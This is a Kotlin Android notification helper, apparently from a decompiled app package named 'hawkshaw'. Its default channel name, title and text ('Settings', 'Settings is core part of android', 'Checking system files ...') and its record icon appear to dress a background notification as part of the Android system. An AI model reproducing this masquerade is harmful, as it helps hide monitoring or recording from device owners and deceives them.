package com.hawkshaw.library.utils

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import com.hawkshaw.library.App
import com.hawkshaw.app.R
import android.util.Log // Added for logging

/**
 * Utility functions for handling notifications
 */
object NotificationKt {
    private const val TAG = "NotificationKtUtils" // Added for logging
    private const val CHANNEL_ID = "NOTIFICATION_CHANNEL_ID" // Changed to match Java version

    private fun createNotificationChannel(context: Context) {
        Log.d(TAG, "[DEBUG] createNotificationChannel called. Context: $context, CHANNEL_ID: \"$CHANNEL_ID\"")
        // NotificationChannel is available from API 26 (Oreo)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d(TAG, "[DEBUG] createNotificationChannel: SDK_INT >= O. Creating NotificationChannel.")
            val channelName = "Settings" // Changed to match Java version
            val channelDescription = "Settings is core part of android" // Changed to match Java version
            val importance = NotificationManager.IMPORTANCE_DEFAULT // 4 is IMPORTANCE_DEFAULT
            Log.d(TAG, "[DEBUG] createNotificationChannel: Name: \"$channelName\", Importance: $importance, Description: \"$channelDescription\"")

            val notificationChannel = NotificationChannel(
                CHANNEL_ID,
                channelName,
                importance
            )
            notificationChannel.description = channelDescription
            
            val notificationManager = context.getSystemService(NotificationManager::class.java) as NotificationManager
            Log.d(TAG, "[DEBUG] createNotificationChannel: NotificationManager instance: $notificationManager")
            notificationManager.createNotificationChannel(notificationChannel)
            Log.d(TAG, "[DEBUG] createNotificationChannel: createNotificationChannel on manager called.")
        } else {
            Log.d(TAG, "[DEBUG] createNotificationChannel: SDK_INT < O. NotificationChannel not required.")
        }
    }

    @JvmStatic // Keep JvmStatic if you need static access from Java
    @JvmOverloads // This annotation generates overloads for default parameters for Java compatibility
    fun getNotification(
        title: String = "Settings", // Default value from Java's synthetic method
        contentText: String = "Checking system files ...", // Default value from Java's synthetic method
        intent: Intent = Intent("android.settings.SETTINGS"), // Default value from Java's synthetic method
        context: Context = App.getContext() // Default value from Java's synthetic method
    ): NotificationCompat.Builder {
        Log.d(TAG, "[DEBUG] getNotification called. Title: \"$title\", ContentText: \"$contentText\", Intent: $intent, Context: $context")

        Log.d(TAG, "[DEBUG] getNotification: Calling createNotificationChannel.")
        createNotificationChannel(context)
        Log.d(TAG, "[DEBUG] getNotification: createNotificationChannel completed.")

        val requestCode = 75 // Matching Java's request code
        val flags = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE // Added FLAG_IMMUTABLE
        Log.d(TAG, "[DEBUG] getNotification: Creating PendingIntent (Activity). RequestCode: $requestCode, Flags: $flags")
        val pendingIntent = PendingIntent.getActivity(
            context,
            requestCode,
            intent,
            flags
        )
        Log.d(TAG, "[DEBUG] getNotification: PendingIntent created: $pendingIntent")

        Log.d(TAG, "[DEBUG] getNotification: Building NotificationCompat.Builder.")
        val contentIntentBuilder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(contentText)
            .setSmallIcon(R.drawable.ic_media_record) // Changed to match Java version
            .setWhen(System.currentTimeMillis()) // Added from Java version
            .setTicker("...") // Added from Java version
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 1 is PRIORITY_DEFAULT
            .setContentIntent(pendingIntent)
        Log.d(TAG, "[DEBUG] getNotification: NotificationCompat.Builder created: $contentIntentBuilder")

        return contentIntentBuilder
    }
}